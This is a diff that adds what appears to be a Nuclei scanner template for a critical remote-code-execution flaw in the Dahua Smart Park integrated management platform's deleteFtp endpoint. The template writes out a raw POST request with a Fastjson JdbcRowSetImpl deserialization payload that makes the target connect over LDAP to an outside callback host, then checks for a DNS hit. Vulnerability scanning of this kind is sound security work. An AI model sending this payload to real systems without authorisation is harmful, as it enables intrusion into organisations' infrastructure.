@@ -1,0 +1,26 @@
+id: dahua-smart-park-deleteftp-rce
+
+info:
+  name: 大华智慧园区综合管理平台 deleteFtp RCE
+  author: SleepingBag945
+  severity: critical
+
+http:
+  - raw:
+
+      - |
+        POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+        Content-Type: application/json
+        Accept-Encoding: gzip
+        SL-CE-SUID: 1063
+
+        {"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}/e","autoCommit":true}}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
